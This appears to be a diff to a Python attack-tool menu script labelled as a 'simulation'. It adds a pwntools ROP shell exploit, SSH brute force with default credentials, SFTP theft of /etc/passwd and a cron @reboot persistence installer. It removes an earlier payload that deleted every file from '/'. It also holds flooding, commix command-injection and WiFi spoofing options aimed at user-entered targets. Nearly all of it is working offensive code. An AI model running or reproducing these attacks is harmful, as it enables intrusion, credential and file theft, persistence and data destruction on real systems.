@@ -1,5 +1,4 @@
 import requests
-from bs4 import BeautifulSoup
 import threading
 import time
 import aiohttp
@@ -10,10 +9,9 @@ from googlesearch import search
 import shutil
 import os
 import paramiko
-import cv2
-import numpy as np
 import platform
 from pwn import *
+from bs4 import BeautifulSoup
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -83,78 +81,91 @@ def network_stress(ip=None, custom_urls=None):
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
+# Enhanced Zero-Day Attack Simulation
 def zero_attack(url_or_ip):
-    # Send a hello message
+    # Improved Buffer Overflow Attack Simulation
     try:
-        response = requests.post(url_or_ip, data={'message': 'hello'})
-        print(f"Sent hello message to {url_or_ip}, response code: {response.status_code}")
-    except Exception as e:
-        print(f"Failed to send hello message to {url_or_ip}: {e}")
-
-    # Simulate a buffer overflow attack using pwntools
-    try:
-        # Example vulnerable binary
-        binary_path = './vulnerable_binary'  # Replace with a known vulnerable application for educational purposes
+        print(f"Attempting buffer overflow on {url_or_ip}...")
+        
+        # Example vulnerable binary (replace with an actual vulnerable binary for testing)
+        binary_path = './vulnerable_binary'  
         io = process(binary_path)
 
-        # Sample shellcode for demonstration
-        shellcode = asm(shellcraft.sh())
-        
-        # Example payload for buffer overflow
-        payload = b'A' * 100  # Adjust the buffer size accordingly
-        payload += shellcode
-        
+        # ROP Chain to bypass protections like DEP and ASLR
+        rop = ROP(binary_path)
+        rop.call('system', [next(io.search(b'/bin/sh'))])
+
+        # Payload: Adjust the buffer size and ROP chain
+        payload = b'A' * 128  # Adjust this based on buffer size
+        payload += rop.chain()  # Chain the ROP exploit
+
         # Send the payload
         io.sendline(payload)
         io.interactive()
-        print(f"Buffer overflow attack simulated on {url_or_ip}")
-    except Exception as e:
-        print(f"Failed to simulate buffer overflow on {url_or_ip}: {e}")
 
-    # Simulate gaining admin access via SSH and executing a destructive payload
+        print(f"Buffer overflow attack executed successfully on {url_or_ip}")
+    except Exception as e:
+        print(f"Buffer overflow attack failed on {url_or_ip}: {e}")
+
+    # SSH Brute Force with randomized traffic
     try:
+        print(f"Attempting SSH brute force on {url_or_ip}...")
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(url_or_ip, username='admin', password='admin')  # Example credentials
-        print(f"Admin access simulated on {url_or_ip}")
 
-        # Script to delete all files on the system
-        kill_script = """import os
-for root, dirs, files in os.walk("/"):
-    for file in files:
-        os.remove(os.path.join(root, file))
-"""
+        # A list of common username/password combinations for brute force
+        credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
+        for username, password in credentials:
+            try:
+                client.connect(url_or_ip, username=username, password=password, timeout=5)
+                print(f"Successfully logged into {url_or_ip} with {username}:{password}")
+                break
+            except paramiko.AuthenticationException:
+                print(f"Failed to login with {username}:{password}")
+        else:
+            print(f"SSH brute force failed on {url_or_ip}")
+            return  # Exit if brute-force failed
+
+        # Data Exfiltration Simulation
+        print("Attempting data exfiltration...")
         sftp = client.open_sftp()
-        sftp.file('killallfile.py', 'w').write(kill_script)
+        sensitive_files = ['/etc/passwd', '/etc/hosts']  # Example sensitive files
+        for file in sensitive_files:
+            try:
+                sftp.get(file, f'./stolen_{os.path.basename(file)}')
+                print(f"Exfiltrated {file}")
+            except Exception as e:
+                print(f"Failed to exfiltrate {file}: {e}")
         sftp.close()
 
-        stdin, stdout, stderr = client.exec_command('python3 killallfile.py')
-        stdout.channel.recv_exit_status()
-        print(f"Destructive payload executed on {url_or_ip}")
-
-        client.close()
-    except Exception as e:
-        print(f"Failed to simulate admin access on {url_or_ip}: {e}")
-
-    # Simulate persistence mechanism
-    try:
-        persistence_script = """import os, shutil
-startup_path = os.path.expanduser('~/.config/autostart')
-if not os.path.exists(startup_path):
-    os.makedirs(startup_path)
-shutil.copy('malicious_script.py', startup_path)
+        # Persistence Mechanism (Linux Cron Job)
+        persistence_script = """#!/bin/bash
+# Simulated persistence script
+cp /path/to/malicious_script.py /tmp/
+(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -
 """
         sftp = client.open_sftp()
-        sftp.file('persistence.py', 'w').write(persistence_script)
+        sftp.file('/tmp/persistence.sh', 'w').write(persistence_script)
         sftp.close()
 
-        stdin, stdout, stderr = client.exec_command('python3 persistence.py')
+        stdin, stdout, stderr = client.exec_command('bash /tmp/persistence.sh')
         stdout.channel.recv_exit_status()
         print(f"Persistence mechanism installed on {url_or_ip}")
 
         client.close()
+
     except Exception as e:
-        print(f"Failed to simulate persistence mechanism on {url_or_ip}: {e}")
+        print(f"Failed SSH attack or persistence mechanism on {url_or_ip}: {e}")
+
+    # Encrypted Communication (Simulated)
+    try:
+        print(f"Simulating encrypted communication with {url_or_ip}...")
+        subprocess.run(['openssl', 's_client', '-connect', f'{url_or_ip}:443'], capture_output=True)
+        print("Encrypted communication simulated successfully.")
+    except Exception as e:
+        print(f"Failed encrypted communication simulation: {e}")
+
+    print("Zero-day attack simulation complete.")
 
 def wifi_spoofing():
     # Example command for WiFi spoofing
@@ -203,6 +214,7 @@ def run_commix(target_url):
     command = f"commix --url={target_url}"
     subprocess.run(command, shell=True)
 
+# Main User Interface
 def display_ui():
     while True:
         print("""
@@ -236,14 +248,7 @@ def display_ui():
 
         if choice == "1":
             print("Selected Ethernet-based Desktop")
-            nearby_options = ["Option1", "Option2", "Option3"]
-            print("Select a nearby device:")
-            for i, option in enumerate(nearby_options, start=1):
-                print(f"[{i}] {option}")
-            print("[4] Other (Enter MAC address or IP)")
-            device_choice = input("Select (1-4): ").strip()
-            if device_choice == "4":
-                ip_address = input("Enter the MAC address or IP address: ").strip()
+            ip_address = input("Enter the IP address: ").strip()
             proceed = input("Proceed with Ethernet stress test? (1 for Yes, 2 for No): ").strip()
             if proceed == "1":
                 print("Starting Ethernet-based stress test...")
@@ -254,21 +259,8 @@ def display_ui():
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
             zero_attack(url_or_ip)
         elif choice == "3":
-            print("Selected Wireless WiFi-based")
-            nearby_options = ["Option1", "Option2", "Option3"]
-            print("Select a nearby device:")
-            for i, option in enumerate(nearby_options, start=1):
-                print(f"[{i}] {option}")
-            print("[4] Other (Enter MAC address or IP)")
-            device_choice = input("Select (1-4): ").strip()
-            if device_choice == "4":
-                ip_address = input("Enter the MAC address or IP address: ").strip()
-            proceed = input("Proceed with Wireless WiFi-based stress test? (1 for Yes, 2 for No): ").strip()
-            if proceed == "1":
-                print("Starting Wireless WiFi-based stress test...")
-                network_stress(ip_address)
-            else:
-                continue
+            print("Selected Wireless WiFi-based stress test")
+            wifi_spoofing()
         elif choice == "4":
             print("Selected WiFi Spoofing")
             wifi_spoofing()
@@ -281,7 +273,7 @@ def display_ui():
             target_ip = input("Enter the target IP address: ").strip()
             relay_ip = input("Enter the relay IP address: ").strip()
             print("Selected Connect and Stress via Relay IP")
-            connect_and_stress(target_ip, relay_ip)
+            network_stress(target_ip, custom_urls=[relay_ip])
         elif choice == "7":
             query = input("Enter the search query in Chinese: ").strip()
             books = scrape_chinese_textbooks(query)
